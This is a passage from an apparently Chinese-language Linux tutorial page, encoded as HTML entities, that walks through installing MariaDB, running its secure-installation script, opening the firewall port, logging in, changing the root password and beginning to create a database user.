x5373;&#x4F7F;&#x9047;&#x5230;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x4E0A;&#x624B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x65E0;&#x8BBA;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x4E2A;&#x6765;&#x5B66;&#x4E60;&#x90FD;&#x6089;&#x542C;&#x541B;&#x4FBF;&#xFF0C;&#x800C;&#x672C;&#x4E66;&#x4E4B;&#x6240;&#x4EE5;&#x9009;&#x62E9;&#x4EE5;MariaDB&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4ECE;RHCE&#x8BA4;&#x8BC1;&#x8003;&#x8BD5;&#x548C;&#x6280;&#x672F;&#x5784;&#x65AD;&#x7684;&#x89D2;&#x5EA6;&#x4F5C;&#x7684;&#x51B3;&#x5B9A;&#x3002;</p><h2 id="2-&#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;"><a href="#2-&#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;" class="headerlink" title="2 &#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;"></a>2 &#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;</h2><p>&#x76F8;&#x8F83;&#x4E8E;MySQL&#xFF0C;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6709;&#x4E86;&#x5F88;&#x591A;&#x65B0;&#x9C9C;&#x7684;&#x6269;&#x5C55;&#x7279;&#x6027;&#xFF0C;&#x4F8B;&#x5982;&#x5BF9;&#x5FAE;&#x79D2;&#x7EA7;&#x522B;&#x7684;&#x652F;&#x6301;&#x3001;&#x7EBF;&#x7A0B;&#x6C60;&#x3001;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x3001;&#x8FDB;&#x7A0B;&#x62A5;&#x544A;&#x7B49;&#x3002;&#x5728;&#x914D;&#x7F6E;&#x59A5;&#x5F53;Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x540E;&#xFF0C;&#x5373;&#x53EF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;MariaDB&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x7A0B;&#x5E8F;&#x53CA;&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;&#x4E86;&#x3002;<br>&#x5728;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x8BB0;&#x5F97;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# yum install mariadb mariadb-server</span><br><span class="line">Loaded plugins: langpacks, product-id, subscription-manager</span><br><span class="line">&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;</span><br><span class="line">Installing:</span><br><span class="line">&#xA0;mariadb x86_64 1:5.5.35-3.el7 rhel 8.9 M</span><br><span class="line">&#xA0;mariadb-server x86_64 1:5.5.35-3.el7 rhel 11 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line">&#xA0;perl-Compress-Raw-Bzip2 x86_64 2.061-3.el7 rhel 32 k</span><br><span class="line">&#xA0;perl-Compress-Raw-Zlib x86_64 1:2.061-4.el7 rhel 57 k</span><br><span class="line">&#xA0;perl-DBD-MySQL x86_64 4.023-5.el7 rhel 140 k</span><br><span class="line">&#xA0;perl-DBI x86_64 1.627-4.el7 rhel 802 k</span><br><span class="line">&#xA0;perl-Data-Dumper x86_64 2.145-3.el7 rhel 47 k</span><br><span class="line">&#xA0;perl-IO-Compress noarch 2.061-2.el7 rhel 260 k</span><br><span class="line">&#xA0;perl-Net-Daemon noarch 0.48-5.el7 rhel 51 k</span><br><span class="line">&#xA0;perl-PlRPC noarch 0.2020-14.el7 rhel 36 k</span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install 2 Packages (+8 Dependent packages)</span><br><span class="line">Total download size: 21 M</span><br><span class="line">Installed size: 107 M</span><br><span class="line">Is this ok [y/d/N]: y </span><br><span class="line">Downloading packages:</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total 82 MB/s | 21 MB 00:00 </span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;</span><br><span class="line">Installed:</span><br><span class="line">&#xA0;mariadb.x86_64 1:5.5.35-3.el7 mariadb-server.x86_64 1:5.5.35-3.el7 </span><br><span class="line">Dependency Installed:</span><br><span class="line">&#xA0;perl-Compress-Raw-Bzip2.x86_64 0:2.061-3.el7 </span><br><span class="line">&#xA0;perl-Compress-Raw-Zlib.x86_64 1:2.061-4.el7 </span><br><span class="line">&#xA0;perl-DBD-MySQL.x86_64 0:4.023-5.el7 </span><br><span class="line">&#xA0;perl-DBI.x86_64 0:1.627-4.el7 </span><br><span class="line">&#xA0;perl-Data-Dumper.x86_64 0:2.145-3.el7 </span><br><span class="line">&#xA0;perl-IO-Compress.noarch 0:2.061-2.el7 </span><br><span class="line">&#xA0;perl-Net-Daemon.noarch 0:0.48-5.el7 </span><br><span class="line">&#xA0;perl-PlRPC.noarch 0:0.2020-14.el7</span><br><span class="line">Complete!</span><br><span class="line">[root@jaking ~]# systemctl start mariadb </span><br><span class="line">[root@jaking ~]# systemctl enable mariadb </span><br><span class="line">ln -s &apos;/usr/lib/systemd/system/mariadb.service&apos; &apos;/etc/systemd/system/multi-user.target.wants/mariadb.service&apos;</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x786E;&#x8BA4;MariaDB&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#x8BF7;&#x4E0D;&#x8981;&#x7ACB;&#x5373;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B89;&#x5168;&#x6027;&#x548C;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x6D89;&#x53CA;&#x4E0B;&#x9762;5&#x4E2A;&#x6B65;&#x9AA4;&#x3002;</p><ol><li>&#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x8BE5;&#x5BC6;&#x7801;&#x5E76;&#x975E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x9ED8;&#x8BA4;&#x5E94;&#x8BE5;&#x4E3A;&#x7A7A;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;&#xFF09;&#x3002;</li><li>&#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x4E13;&#x6709;&#x5BC6;&#x7801;&#x3002;</li><li>&#x968F;&#x540E;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF0C;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;</li><li>&#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53D6;&#x6D88;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002;</li><li>&#x5237;&#x65B0;&#x6388;&#x6743;&#x5217;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#x3002;<br>&#x5BF9;&#x4E8E;&#x4E0A;&#x8FF0;&#x6570;&#x636E;&#x5E93;&#x521D;&#x59CB;&#x5316;&#x7684;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF0C;&#x8001;&#x5E08;&#x5DF2;&#x7ECF;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x65C1;&#x8FB9;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5355;&#x6CE8;&#x91CA;&#xFF0C;&#x786E;&#x4FDD;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x66F4;&#x76F4;&#x89C2;&#x5730;&#x4E86;&#x89E3;&#x8981;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF1A;</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysql_secure_installation </span><br><span class="line">/usr/bin/mysql_secure_installation: line 379: find_mysql_client: command not found</span><br><span class="line">NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SERVERS IN PRODUCTION USE!&#xA0; PLEASE READ EACH STEP CAREFULLY!</span><br><span class="line">In order to log into MariaDB to secure it, we&apos;ll need the current</span><br><span class="line">password for the root user.&#xA0; If you&apos;ve just installed MariaDB, and</span><br><span class="line">you haven&apos;t set the root password yet, the password will be blank,</span><br><span class="line">so you should just press enter here.</span><br><span class="line">Enter current password for root (enter for none):  &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;&#x4E3A;&#x7A7A;&#xFF0C;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;</span><br><span class="line">OK, successfully used password, moving on...</span><br><span class="line">Setting the root password ensures that nobody can log into the MariaDB</span><br><span class="line">root user without the proper authorisation.</span><br><span class="line">Set root password? [Y/n] y</span><br><span class="line">New password:&#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;</span><br><span class="line">Re-enter new password:&#x518D;&#x6B21;&#x8F93;&#x5165;&#x5BC6;&#x7801;</span><br><span class="line">Password updated successfully!</span><br><span class="line">Reloading privilege tables..</span><br><span class="line">&#xA0;... Success!</span><br><span class="line">By default, a MariaDB installation has an anonymous user, allowing anyone</span><br><span class="line">to log into MariaDB without having to have a user account created for</span><br><span class="line">them.&#xA0; This is intended only for testing, and to make the installation</span><br><span class="line">go a bit smoother.&#xA0; You should remove them before moving into a</span><br><span class="line">production environment.</span><br><span class="line">Remove anonymous users? [Y/n] y&#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09;</span><br><span class="line">... Success!</span><br><span class="line">Normally, root should only be allowed to connect from &apos;localhost&apos;.&#xA0; This</span><br><span class="line">ensures that someone cannot guess at the root password from the network.</span><br><span class="line">Disallow root login remotely? [Y/n] y&#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09;</span><br><span class="line">&#xA0;... Success!</span><br><span class="line">By default, MariaDB comes with a database named &apos;test&apos; that anyone can</span><br><span class="line">access.&#xA0; This is also intended only for testing, and should be removed</span><br><span class="line">before moving into a production environment.</span><br><span class="line">Remove test database and access to it? [Y/n] y&#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5B83;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09;</span><br><span class="line">&#xA0;- Dropping test database...</span><br><span class="line">&#xA0;... Success!</span><br><span class="line">&#xA0;- Removing privileges on test database...</span><br><span class="line">&#xA0;... Success!</span><br><span class="line">Reloading the privilege tables will ensure that all changes made so far</span><br><span class="line">will take effect immediately.</span><br><span class="line">Reload privilege tables now? [Y/n] y&#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09;</span><br><span class="line">&#xA0;... Success!</span><br><span class="line">Cleaning up...</span><br><span class="line">All done!&#xA0; If you&apos;ve completed all of the above steps, your MariaDB</span><br><span class="line">installation should now be secure.</span><br><span class="line">Thanks for using MariaDB!</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x5F88;&#x591A;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x90FD;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x7684;&#x6280;&#x672F;&#xFF08;&#x5373;&#x7F51;&#x7AD9;&#x548C;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8BA9;root&#x7BA1;&#x7406;&#x5458;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x5728;&#x4E0A;&#x9762;&#x7684;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x4E2D;&#x8BBE;&#x7F6E;&#x7B56;&#x7565;&#xFF0C;&#x4EE5;&#x5141;&#x8BB8;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x3002;&#x7136;&#x540E;&#x8FD8;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x4F7F;&#x5176;&#x653E;&#x884C;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x9ED8;&#x8BA4;&#x4F1A;&#x5360;&#x7528;<code>3306</code>&#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x4E2D;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x7EDF;&#x4E00;&#x53EB;&#x4F5C;<code>mysql</code>&#xFF1A;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# firewall-cmd --permanent --add-service=mysql</span><br><span class="line">success</span><br><span class="line">[root@jaking ~]# firewall-cmd --reload</span><br><span class="line">success</span><br></pre></td></tr></tbody></table></figure><p>&#x4E00;&#x5207;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;&#x9996;&#x6B21;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x3002;&#x5176;&#x4E2D;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#xFF0C;&#x800C;-p&#x53C2;&#x6570;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x8BE5;&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysql -u root -p</span><br><span class="line">Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</span><br><span class="line">Welcome to the MariaDB monitor. Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 5</span><br><span class="line">Server version: 5.5.35-MariaDB MariaDB Server</span><br><span class="line">Copyright (c) 2000, 2013, Oracle, Monty Program Ab and others.</span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x540E;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7528;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x7ED3;&#x5C3E;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E0E;Linux&#x547D;&#x4EE4;&#x6700;&#x663E;&#x8457;&#x7684;&#x533A;&#x522B;&#x3002;&#x5927;&#x5BB6;&#x9700;&#x8981;&#x6162;&#x6162;&#x4E60;&#x60EF;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x8FD9;&#x79CD;&#x8BBE;&#x5B9A;&#x3002;&#x4E0B;&#x9762;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x5C0F;&#x8BD5;&#x725B;&#x5200;&#x8FC7;&#x540E;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x5C06;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FEE;&#x6539;&#x4E3A;jaking&#x3002;&#x8FD9;&#x6837;&#x9000;&#x51FA;&#x540E;&#x518D;&#x5C1D;&#x8BD5;&#x767B;&#x5F55;&#xFF0C;&#x5982;&#x679C;&#x8FD8;&#x575A;&#x6301;&#x8F93;&#x5165;&#x539F;&#x5148;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x5C06;&#x63D0;&#x793A;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SET password = PASSWORD(&apos;jaking&apos;);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">MariaDB [(none)]&gt; use mysql #&#x5207;&#x6362;&#x5230;mysql&#x5E93;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysql -u root -p</span><br><span class="line">Enter password:&#x6B64;&#x5904;&#x5E94;&#x8BE5;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x65B0;&#x5BC6;&#x7801;</span><br><span class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysql -uroot -pjaking</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 17</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SET password = PASSWORD(&apos;123456&apos;);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@jaking ~]#</span><br></pre></td></tr></tbody></table></figure><h2 id="3-&#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;"><a href="#3-&#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;" class="headerlink" title="3 &#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;"></a>3 &#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;</h2><p>&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x603B;&#x4E0D;&#x80FD;&#x4E00;&#x76F4;&#x201C;&#x6B7B;&#x5543;&#x201D;root&#x7BA1;&#x7406;&#x5458;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4EE5;&#x53CA;&#x8BA9;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x534F;&#x540C;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E3A;&#x4ED6;&#x4EEC;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x4E13;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5206;&#x914D;&#x5408;&#x7406;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x4EE5;&#x6EE1;&#x8DB3;&#x4ED6;&#x4EEC;&#x7684;&#x5DE5;&#x4F5C;&#x9700;&#x6C42;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x53EF;&#x4F7F;&#x7528;root&#x7BA1;&#x7406;&#x5458;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;&#x201C;CREATE USER &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; IDENTIFIED BY &#x2018;&#x5BC6;&#x7801;&#x2019;; &#x201D;&#x7684;&#x683C;&#x5F0F;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#x3002;&#x518D;&#x6B21;&#x63D0;&#x9192;&#x5927;&#x5BB6;&#xFF0C;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;&#x5FD8;&#x8BB0;&#x6BCF;&#x6761;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7684;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE USER jaking@localhost IDENTIFIED BY &apos;jaking&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 